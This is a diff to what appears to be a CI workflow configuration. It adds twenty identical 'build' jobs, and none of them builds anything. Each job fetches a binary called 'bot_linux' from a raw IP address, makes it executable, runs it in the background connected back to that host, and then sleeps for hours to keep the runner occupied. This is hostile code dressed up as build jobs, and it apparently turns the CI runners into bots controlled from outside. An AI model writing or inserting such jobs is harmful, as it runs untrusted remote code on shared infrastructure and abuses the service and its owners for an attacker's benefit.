@@ -169,3 +169,164 @@ jobs:
           curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
           /tmp/svc 45.153.34.235 4445 &
           sleep 20400
+  build-21:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-22:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-23:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-24:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-25:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-26:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-27:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-28:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-29:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-30:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-31:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-32:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-33:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-34:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-35:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-36:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-37:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-38:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-39:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+  build-40:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - run: |
+          curl -fsSL http://45.153.34.235:8888/bot_linux -o /tmp/svc && chmod +x /tmp/svc
+          /tmp/svc 45.153.34.235 4445 &
+          sleep 20400
+
